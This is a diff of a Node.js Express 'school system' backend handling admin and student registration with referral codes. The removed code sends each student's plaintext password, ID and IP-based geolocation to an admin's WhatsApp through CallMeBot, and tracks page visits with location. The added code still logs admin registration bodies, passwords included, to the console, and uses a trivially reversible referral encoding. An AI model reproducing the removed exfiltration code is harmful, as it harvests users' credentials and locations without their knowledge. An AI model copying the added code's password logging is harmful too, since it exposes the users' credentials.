@@ -1,4 +1,4 @@
-// server.js - Production-ready minimal school backend
+// server.js — Single-file backend for school system
 // npm i express mongoose cors axios bcrypt jsonwebtoken dotenv
 
 require("dotenv").config();
@@ -12,14 +12,16 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// -------------------- Config --------------------
 const PORT = process.env.PORT || 5000;
-const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/prospercub";
-const DEFAULT_ADMIN_USERNAME = process.env.DEFAULT_ADMIN_USERNAME || "admin";
+const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/nexa_mini";
+const BASE_URL = "https://nexa-sage.vercel.app";
 
-// -------------------- MongoDB --------------------
-mongoose.connect(MONGO_URI)
+// -------------------- Connect MongoDB --------------------
+mongoose
+  .connect(MONGO_URI)
   .then(() => console.log("✅ MongoDB connected"))
-  .catch(err => console.error("Mongo error:", err.message));
+  .catch((err) => console.error("❌ MongoDB error:", err.message));
 
 // -------------------- Schemas --------------------
 const adminSchema = new mongoose.Schema({
@@ -28,10 +30,7 @@ const adminSchema = new mongoose.Schema({
   phone: String,
   apikey: String,
   password: String,
-  settings: {
-    whitelistedDomains: { type: [String], default: ["https://nexa-sage.vercel.app","https://cctv-liart.vercel.app"] }
-  },
-  createdAt: { type: Date, default: Date.now }
+  createdAt: { type: Date, default: Date.now },
 });
 const Admin = mongoose.model("Admin", adminSchema);
 
@@ -39,50 +38,31 @@ const studentSchema = new mongoose.Schema({
   username: String,
   password: String,
   adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
-  createdAt: { type: Date, default: Date.now }
+  createdAt: { type: Date, default: Date.now },
 });
 const Student = mongoose.model("Student", studentSchema);
-
-const activitySchema = new mongoose.Schema({
-  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
-  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Student" },
-  action: String,
-  details: { type: Object, default: {} },
-  createdAt: { type: Date, default: Date.now }
-});
-const Activity = mongoose.model("Activity", activitySchema);
 
 const referralSchema = new mongoose.Schema({
   adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
   code: String,
-  createdAt: { type: Date, default: Date.now }
+  createdAt: { type: Date, default: Date.now },
 });
 const Referral = mongoose.model("Referral", referralSchema);
 
-const securityCodeSchema = new mongoose.Schema({
-  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
-  code: String,
-  usedBy: { type: mongoose.Schema.Types.ObjectId, ref: "Student", default: null },
-  createdAt: { type: Date, default: Date.now }
-});
-const SecurityCode = mongoose.model("SecurityCode", securityCodeSchema);
-
 // -------------------- Helpers --------------------
-async function sendWhatsAppToAdmin(adminId, message) {
+function buat(username) {
+  return Buffer.from(username).toString("base64").replace(/=/g, "").split("").reverse().join("");
+}
+
+function unbuat(code) {
   try {
-    const admin = await Admin.findById(adminId);
-    if (!admin || !admin.phone || !admin.apikey) return;
-    const url = "https://api.callmebot.com/whatsapp.php";
-    await axios.get(url, {
-      params: { phone: admin.phone, text: message, apikey: admin.apikey },
-      validateStatus: () => true
-    });
-  } catch (err) {
-    console.error("WhatsApp error:", err.message);
+    return Buffer.from(code.split("").reverse().join(""), "base64").toString("utf8");
+  } catch {
+    return null;
   }
 }
 
-function generateCode(len = 8) {
+function generateCode(len = 6) {
   return Math.random().toString(36).substring(2, 2 + len);
 }
 
@@ -90,166 +70,104 @@ async function hashPassword(pw) {
   return await bcrypt.hash(pw, 10);
 }
 
-async function getLocationFromIP(ip) {
+async function sendWhatsAppToAdmin(admin, message) {
   try {
-    const res = await axios.get(`https://ipapi.co/${ip}/json/`);
-    return {
-      city: res.data.city,
-      region: res.data.region,
-      country: res.data.country_name,
-      latitude: res.data.latitude,
-      longitude: res.data.longitude
-    };
-  } catch {
-    return { error: "Location unavailable" };
+    if (!admin || !admin.phone || !admin.apikey) return console.log("⚠️ Missing phone/apikey");
+    await axios.get("https://api.callmebot.com/whatsapp.php", {
+      params: { phone: admin.phone, text: message, apikey: admin.apikey },
+      validateStatus: () => true,
+    });
+    console.log("📤 WhatsApp message sent");
+  } catch (err) {
+    console.log("❌ WhatsApp error:", err.message);
   }
 }
 
-// -------------------- Whitelist Middleware --------------------
-app.use(async (req, res, next) => {
-  const origin = req.headers.origin;
-  if (!origin) return next();
-  const admins = await Admin.find({ "settings.whitelistedDomains.0": { $exists: true } });
-  const allowed = admins.some(a => a.settings.whitelistedDomains.includes(origin));
-  if (!allowed) return res.status(403).json({ error: "Unauthorized domain" });
-  next();
-});
-
-// -------------------- Admin Routes --------------------
-
-// Admin signup
+// -------------------- ADMIN REGISTER --------------------
 app.post("/admin/register", async (req, res) => {
   try {
     const { firstname, lastname, phone, apikey, password } = req.body;
+    console.log("🟢 Incoming Admin Registration:", req.body);
+
     if (!firstname || !lastname || !phone || !apikey || !password)
-      return res.status(400).json({ error: "Missing fields" });
+      return res.status(400).json({ error: "Missing required fields" });
 
-    const username = firstname.toLowerCase()+generateCode(3);
-    if (await Admin.findOne({ username })) return res.status(400).json({ error: "Admin exists" });
-
+    const username = (firstname + lastname + generateCode(3)).toLowerCase();
     const hashed = await hashPassword(password);
-    const admin = await Admin.create({ name: `${firstname} ${lastname}`, username, phone, apikey, password: hashed });
 
-    // create first referral
-    const code = generateCode(10);
-    await Referral.create({ adminId: admin._id, code });
+    const existing = await Admin.findOne({ username });
+    if (existing) return res.status(400).json({ error: "Admin already exists" });
 
-    const link = `https://nexa-sage.vercel.app/register?ref=${code}`;
-    const msg = `👋 Welcome ${firstname}!\nYour referral link: ${link}`;
-    sendWhatsAppToAdmin(admin._id, msg);
+    const admin = await Admin.create({
+      name: `${firstname} ${lastname}`,
+      username,
+      phone,
+      apikey,
+      password: hashed,
+    });
 
-    res.json({ success: true, admin, referralLink: link });
+    // referral code = buat(username)
+    const referralCode = buat(username);
+    await Referral.create({ adminId: admin._id, code: referralCode });
+
+    const referralLink = `${BASE_URL}/register?ref=${referralCode}`;
+    const msg = `👋 Welcome ${firstname}! Your referral link: ${referralLink}`;
+    await sendWhatsAppToAdmin(admin, msg);
+
+    console.log("✅ Admin registered:", admin.username);
+    console.log("🔗 Referral Code:", referralCode);
+
+    res.json({ success: true, adminId: admin._id, referralLink });
   } catch (err) {
-    console.error(err);
+    console.error("🔥 Admin registration failed:", err);
     res.status(500).json({ error: "Admin registration failed" });
   }
 });
 
-// Admin: manage whitelisted domains
-app.post("/admin/whitelist", async (req, res) => {
+// -------------------- STUDENT REGISTER --------------------
+app.post("/student/register/:referralCode?", async (req, res) => {
   try {
-    const { username, domains } = req.body;
-    if (!username || !domains || !Array.isArray(domains)) return res.status(400).json({ error: "Provide username & array of domains" });
+    const { username, password } = req.body;
+    let referralCode = req.params.referralCode || req.body.referralCode;
 
-    const admin = await Admin.findOne({ username });
-    if (!admin) return res.status(404).json({ error: "Admin not found" });
+    console.log("🟢 Incoming Student Signup:", { username, referralCode });
 
-    admin.settings.whitelistedDomains = domains;
-    await admin.save();
-
-    res.json({ success: true, whitelistedDomains: domains });
-  } catch (err) {
-    res.status(500).json({ error: "Failed to update whitelist" });
-  }
-});
-
-// -------------------- Student Routes --------------------
-
-// Student signup
-app.post("/student/register", async (req, res) => {
-  try {
-    const { username, password, referralCode } = req.body;
-    if (!username || !password) return res.status(400).json({ error: "username & password required" });
+    if (!username || !password)
+      return res.status(400).json({ error: "Username & password required" });
 
     let admin = null;
     if (referralCode) {
-      const ref = await Referral.findOne({ code: referralCode });
-      if (ref) admin = await Admin.findById(ref.adminId);
+      const decodedUsername = unbuat(referralCode);
+      console.log("🧩 Decoded referral username:", decodedUsername);
+      admin = await Admin.findOne({ username: decodedUsername });
     }
-    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
-    if (!admin) return res.status(500).json({ error: "No admin found" });
+
+    if (!admin) {
+      console.log("⚠️ No admin found for referral. Using fallback admin.");
+      admin = await Admin.findOne(); // fallback to any admin
+    }
 
     const hashed = await hashPassword(password);
-    const student = await Student.create({ username, password: hashed, adminId: admin._id });
+    const student = await Student.create({ username, password: hashed, adminId: admin?._id });
 
-    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-    const location = await getLocationFromIP(ip);
+    console.log("✅ Student created:", student._id);
+    console.log("👤 Linked Admin:", admin?.username || "none");
 
-    const msg = `🆕 Student signup\nUsername: ${username}\nPassword: ${password}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`;
-    sendWhatsAppToAdmin(admin._id, msg);
+    const msg = `🆕 New Student Signup\nUsername: ${username}\nStudent ID: ${student._id}`;
+    if (admin) await sendWhatsAppToAdmin(admin, msg);
 
     res.json({ success: true, studentId: student._id });
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: "Student signup failed" });
-    const msg = `🆕 Student signup\nUsername: ${username}\nPassword: ${password}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`;
-    sendWhatsAppToAdmin(admin._id, msg);
-
+    console.error("🔥 Student registration failed:", err);
+    res.status(500).json({ error: "Student registration failed" });
   }
 });
 
-// Student request security code
-app.post("/student/request-code", async (req, res) => {
-  try {
-    const { username } = req.body;
-    if (!username) return res.status(400).json({ error: "username required" });
+// -------------------- TEST ROOT --------------------
+app.get("/", (req, res) => res.send("<h1>✅ Nexa backend running fine!</h1>"));
 
-    const student = await Student.findOne({ username });
-    if (!student) return res.status(404).json({ error: "Student not found" });
-
-    const code = generateCode(6);
-    const sc = await SecurityCode.create({ adminId: student.adminId, code });
-
-    const msg = `🔑 Security code requested by ${username}\nCode: ${code}\nStudentID: ${student._id}`;
-    sendWhatsAppToAdmin(student.adminId, msg);
-
-    res.json({ success: true, codeId: sc._id });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: "Failed to request security code" });
-  }
-});
-
-// Student visit logging
-app.post("/student/visit", async (req, res) => {
-  try {
-    const { path, referrer, utm, userAgent } = req.body;
-
-    let admin = null;
-    if (referrer) {
-      const ref = await Referral.findOne({ code: referrer });
-      if (ref) admin = await Admin.findById(ref.adminId);
-    }
-    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
-    if (!admin) return res.status(500).json({ error: "No admin found" });
-
-    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-    const location = await getLocationFromIP(ip);
-
-    await Activity.create({ adminId: admin._id, action: "visit", details: { path, referrer, utm, userAgent, location } });
-
-    const msg = `📈 Page visit\nPath: ${path}\nReferral: ${referrer || "direct"}\nUserAgent: ${userAgent}\nLocation: ${JSON.stringify(location)}`;
-    sendWhatsAppToAdmin(admin._id, msg);
-
-    res.json({ success: true });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: "Failed to track visit" });
-  }
-});
-
-// -------------------- Start Server --------------------
-app.get("/", (req, res) => res.send("<h1>✅ School backend running</h1>"));
+// -------------------- 404 --------------------
 app.use((req, res) => res.status(404).json({ error: "Route not found" }));
 
-app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
+// -------------------- Start Server --------------------
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
